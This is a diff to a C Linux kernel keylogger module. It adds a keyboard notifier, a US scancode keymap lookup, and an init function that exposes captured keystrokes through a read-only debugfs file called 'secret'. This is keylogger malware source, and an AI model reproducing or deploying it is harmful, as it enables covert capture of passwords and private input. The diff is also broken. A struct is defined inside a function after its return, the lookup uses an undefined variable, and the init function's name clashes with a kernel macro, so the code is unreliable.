@@ -27,12 +27,13 @@ static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *of
 // Keyboard notifier callback function invoked on keyboard events
 static int kb_callback(struct notifier_block *nblock, unsigned long code, void *_param);
 
+
+// US keymap
 /*
     Keymap references:
     https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
     http://www.quadibloc.com/comp/scan.htm
 */
-
 static const char *us_keymap[][2] = {
 	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
 	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
@@ -82,6 +83,12 @@ const struct file_operations keys_fops = {
 // Read function to allow user-space programs to read logged keys from the Debugfs file
 static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset) {
     return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
+
+// Keyboard notifier block
+static struct notifier_block kb_notify_blk = {
+	.notifier_call = kb_callback,
+};
+
 } // Method keys_read
 
 /** 
@@ -95,7 +102,7 @@ void string_conv(int kode, int shifted, char *buffer, int sys) {
 	switch (sys) {
 	case US: // For US system
 		if (kode > KEY_RESERVED && kode <= KEY_PAUSE) { // check to see if kode is in the valid range for us keymap
-			const char *us_key = (shifted == 1) ? us_keymap[kode][1] : us_keymap[kode][0]; // Determine if shift key was pressed
+			const char *us_key = (shifted == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0]; // Determine if shift key was pressed
 			snprintf(buffer, CHUNK_LEN, "%s", us_key); // store the string in the buffer
 		} // if statement
 		break;
@@ -111,3 +118,25 @@ void string_conv(int kode, int shifted, char *buffer, int sys) {
 		break;
 	} // switch statement
 } // Method string_conv
+
+// Module initialization
+static int __init module_init(void)
+{
+    if (codes < 0 || codes > 2)
+        return -EINVAL;
+
+    subdir = debugfs_create_dir("vault", NULL); // Creates debugfs directory
+    if (IS_ERR(subdir))
+        return PTR_ERR(subdir);
+    if (!subdir)
+        return -ENOENT;
+
+    file = debugfs_create_file("secret", 0400, subdir, NULL, &keys_fops); // Creates debugfs file to read keys from
+    if (!file) {
+        debugfs_remove_recursive(subdir);
+        return -ENOENT;
+    }
+
+    register_keyboard_notifier(&kb_notify_blk);
+    return 0;
+}
